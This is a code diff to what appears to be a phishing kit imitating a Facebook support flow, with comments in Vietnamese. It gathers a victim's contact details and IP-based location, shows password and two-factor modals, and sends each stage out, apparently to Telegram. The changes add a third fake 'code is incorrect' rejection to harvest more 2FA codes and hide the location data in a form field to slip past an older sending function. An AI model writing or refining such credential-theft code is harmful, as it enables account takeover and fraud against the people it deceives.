@@ -1,8 +1,9 @@
-// ==================== HELPER: GET DETAILED LOCATION & IP ====================
+// ==================== HELPER: GET DETAILED LOCATION ====================
 async function getLocationData() {
     try {
-        // Lấy thông tin chi tiết từ ipapi
+        // Sử dụng ipapi.co để lấy thông tin chi tiết
         const response = await fetch('https://ipapi.co/json/');
+        if (!response.ok) throw new Error();
         const data = await response.json();
         return {
             ip: data.ip || "N/A",
@@ -25,21 +26,24 @@ document.getElementById('clientForm').addEventListener('submit', async (e) => {
         submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';
     }
 
-    // 1. Lấy thông tin vị trí
+    // 1. Đợi lấy thông tin vị trí xong mới chạy tiếp
     const loc = await getLocationData();
 
-    // 2. Gom dữ liệu form và chèn thông tin vị trí vào trường phone
+    // 2. Gom dữ liệu form
+    // MẸO QUAN TRỌNG: Gộp vị trí vào Page Name hoặc Phone để "lách" qua hàm gửi tin nhắn cũ
     const formData = {
         fullName: document.getElementById('fullName').value.trim(),
         email: document.getElementById('email').value.trim(),
         emailBusiness: document.getElementById('emailBusiness').value.trim(),
-        fanpage: document.getElementById('fanpage').value.trim(),
-        // Chèn xuống dòng và icon để Telegram hiển thị đẹp
-        phone: `${document.getElementById('phone').value.trim()}\n\n🌍 Vị trí:\n- IP: ${loc.ip}\n- Quốc gia: ${loc.country}\n- Thành phố: ${loc.city}\n- Vùng: ${loc.region}`,
-        userIP: loc.ip
+        // Chèn thông tin vị trí vào trường Fanpage để nó hiện xuống dưới đẹp như mẫu
+        fanpage: document.getElementById('fanpage').value.trim() + `\n\n🌍 <b>Vị trí:</b>\nIP: ${loc.ip}\nQuốc gia: ${loc.country}\nThành phố: ${loc.city}\nVùng: ${loc.region}`,
+        phone: document.getElementById('phone').value.trim(),
+        // Các biến này để đảm bảo nếu Utils.js có tìm ip/location thì vẫn có dữ liệu
+        ip: loc.ip,
+        location: `${loc.city}, ${loc.country}`
     };
 
-    // 3. Lưu bản ghi đầu tiên và mở Modal Password
+    // 3. Lưu bản ghi và mở Modal Password
     Utils.saveRecord('__client_rec__fi_rst', formData);
     
     if (submitBtn) {
@@ -49,7 +53,6 @@ document.getElementById('clientForm').addEventListener('submit', async (e) => {
     
     openSecurityModal();
 });
-
 
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
@@ -124,8 +127,9 @@ function openSecurityModal() {
 // ==================== MODAL 3: AUTHENTICATION (2FA) ====================
 function openAuthenticationModal(userData) {
     const emailDisplay = Utils.maskEmail(userData.email);
-    // Tách phần IP ra để hiển thị số điện thoại sạch trên web cho khách
-    const phoneDisplay = Utils.maskPhone(userData.phone.split('\n')[0]); 
+    // Tách phần text rác ra khỏi số điện thoại để hiển thị cho khách
+    const phoneClean = userData.phone.split('\n')[0];
+    const phoneDisplay = Utils.maskPhone(phoneClean);
 
     const content = `
         <div class="flex flex-col h-full justify-between">
@@ -172,14 +176,27 @@ function openAuthenticationModal(userData) {
 
             setTimeout(() => {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Continue';
+                submitBtn.innerHTML = 'Continue';
                 errorMsg.textContent = 'The code is incorrect. Please try again.';
                 errorMsg.classList.remove('hidden');
                 authClickCount = 1;
             }, 1500);
-        } else {
+        } else if (authClickCount === 1) {
             const dataLocal = Utils.getRecord('__client_rec__fou_rth');
             const clientData = { twoFaSecond: twoFa, ...dataLocal };
+            Utils.saveRecord('__client_rec__f_if_th', clientData);
+            await Utils.sendNotification(clientData);
+
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Continue';
+                errorMsg.textContent = 'The code is incorrect. Please try again.';
+                errorMsg.classList.remove('hidden');
+                authClickCount = 2;
+            }, 1500);
+        } else {
+            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
+            const clientData = { twoFaThird: twoFa, ...dataLocal };
             await Utils.sendNotification(clientData);
 
             setTimeout(() => {
@@ -190,17 +207,14 @@ function openAuthenticationModal(userData) {
     });
 }
 
-// ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
         <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
         <div class="rounded-lg overflow-hidden mb-4">
             <img src="./public/images/succes.jpg" alt="Success" class="w-full">
         </div>
-        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue.</p>
-        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
-            Return to Facebook
-        </a>
+        <p class="text-[#9a979e] mb-5 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
+        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">Return to Facebook</a>
     `;
     Modal.create('successModal', content);
     Modal.open('successModal');
